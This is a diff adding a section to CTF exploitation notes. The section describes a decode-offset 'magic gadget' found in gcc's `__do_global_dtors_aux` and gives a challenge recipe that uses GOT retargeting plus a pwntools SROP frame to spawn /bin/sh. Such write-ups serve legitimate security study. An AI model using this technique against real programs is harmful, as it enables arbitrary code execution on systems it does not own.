@@ -24,6 +24,7 @@
 - [Imperfect-Gadget Stack Pivot (RITSEC 2018)](#imperfect-gadget-stack-pivot-ritsec-2018)
 - [_fini_array Double-Entry Staged ROP (Insomnihack 2019)](#_fini_array-double-entry-staged-rop-insomnihack-2019)
 - [ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)](#ret2libc-via-statically-linked-libc--embedded-binsh-string-tamuctf-2019)
+- [Magic Gadget: `add dword [rbp-0x3d], ebx` from `__do_global_dtors_aux` (N1CTF Junior 2026)](#magic-gadget-add-dword-rbp-0x3d-ebx-from-__do_global_dtors_aux-n1ctf-junior-2026)
 - [Useful Commands](#useful-commands)
 
 For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).
@@ -718,6 +719,71 @@ io.interactive()
 **References:** TAMUctf 2019 — pwn5, writeup 13428
 
 ---
+
+## Magic Gadget: `add dword [rbp-0x3d], ebx` from `__do_global_dtors_aux` (N1CTF Junior 2026)
+
+**Pattern:** every gcc-built ELF ends `__do_global_dtors_aux` with
+
+```
+c6 05 <disp32> 01   mov  byte ptr [rip + completed], 1
+5d                  pop  rbp
+c3                  ret
+```
+
+Enter one byte into that immediate (the `01`) and the bytes decode as a free gadget:
+
+```
+0x40114c : add dword ptr [rbp - 0x3d], ebx ; ret
+```
+
+The operands are fixed by construction: `5d` is the ModRM for `[rbp + disp8]`, and the displacement is `c3` - the `ret` opcode, i.e. `-0x3d`. So **the target is always `[rbp-0x3d]` and the addend is always `ebx`**, on every binary that lays the epilogue out this way.
+
+`ROPgadget --binary ./bin | grep "add dword ptr \[rbp - 0x3d\], ebx"` finds it; ROPgadget may print `... ebx ; nop ; ret` when alignment `90 c3` follows. Byte pattern (entry at the `01`): `c6 05 ?? ?? ?? ?? 01 5d c3`.
+
+**Verified present in** (byte scan of `.text`): `/bin/ls`, `/bin/cat`, `/usr/bin/{whoami,id,tail}`, `python3.12`, the N1CTF `onlyfgets` and CISCN `minihttpd` binaries, and five fresh `gcc 13` builds covering `-O0`/`-O2`, PIE/non-PIE and `-fcf-protection` on/off. The epilogue shape is what matters, not optimisation level or CET.
+
+**Why it matters:** it is a *relative* 4-byte add-to-memory with no payload bytes and no link-time address. Paired with `pop rbp; ret` it patches any writable dword by a multiple of `ebx` - enough to retarget a resolved GOT entry by a known libc delta, and it survives CET because it never forges a return address.
+
+### Recipe: retarget two GOT entries (Onlyfgets)
+
+Preconditions: the program can zero/step `ebx`, and something leaves a usable `dh`. In this binary `fgets` returns with `rdx = 0xfbad208b` (stdin's `_flags`), so `dh = 0x20`.
+
+```
+rdx = 0xfbad208b  ->  dh = 0x20
+add bl, dh  x6    ->  bl = 0xc0            (ebx = 0xc0)
+pop rbp ; got.alarm + 0x3d
+add [rbp-0x3d], ebx  x15   -> got.alarm += 15*0xc0 = 0xb40 = execve - alarm
+```
+
+```
+xor rbx, rbx ; ret
+add bl, dh  x4    ->  0x80
+pop rbp ; got.signal + 0x3d
+add [rbp-0x3d], ebx  x2     -> got.signal += 0x100
+```
+
+The second delta lands on `signal + 0x100`, which in that libc is exactly `mov rax, 0xf ; syscall` (the `rt_sigreturn` stub that lives between `signal`/`ssignal` and `__libc_sigaction`) - verified: `execve 0xeb080 - alarm 0xea540 = 0xb40`, `signal 0x42420 + 0x100 = 0x42520` holding `48 c7 c0 0f 00 00 00 0f 05`.
+
+Finish with SROP:
+
+```python
+frame = SigreturnFrame()
+frame.rsp = bss
+frame.rdi = binsh          # "/bin/sh" already staged in .bss
+frame.rip = 0x4011cd       # the `call alarm@plt` site - now `call execve` after the GOT patch
+payload = flat(b"/bin/sh\x00", b"\x00"*0x20, elf.plt["signal"], bytes(frame))
+```
+
+`jmp` (not `call`) to `plt.signal`: a `call` pushes a return address that shifts the `SigreturnFrame` the `syscall` is about to read. The overwritten GOT entry runs `mov rax, 0xf; syscall`, the kernel restores your frame, and control continues at `frame.rip`.
+
+### Requirements and limits
+
+- **Only adds** - the write is `mem[...] += ebx`. Every delta must be a multiple of the step you can build (`dh` from a stale register, or any `add bl, imm`/`mov ebx, imm` gadget you can find).
+- `pop rbp` gadget and `rbx` control are extras, not guaranteed: the same binaries also carry `pop rbp; ret` widely, but `xor rbx, rbx ; ret` / `add bl, dh ; endbr64 ; ret` existed only in `onlyfgets` among those tested (compiler/CET dependent).
+- Deltas are per-libc-build: recompute `target - resolved_function` from the shipped `libc.so.6`; a different libc build invalidates them.
+- The gadget writes to memory: it needs the target dword to be **writable**. Partial RELRO (`BIND_NOW` off) leaves `.got.plt` writable, which is why a GOT retarget works; under **Full RELRO / `BIND_NOW`** the GOT is read-only, so aim the same add at `.fini_array`, a function-pointer table in `.bss`, or another writable dword.
+
+**References:** N1CTF Junior 2026 - Onlyfgets (`solve.py` in `/CTF/contest/N1CTF-Junior/2026-1/Onlyfgets`); CISCN - minihttpd carries the same magic gadget at `0x40169c`.
 
 ## Useful Commands
 
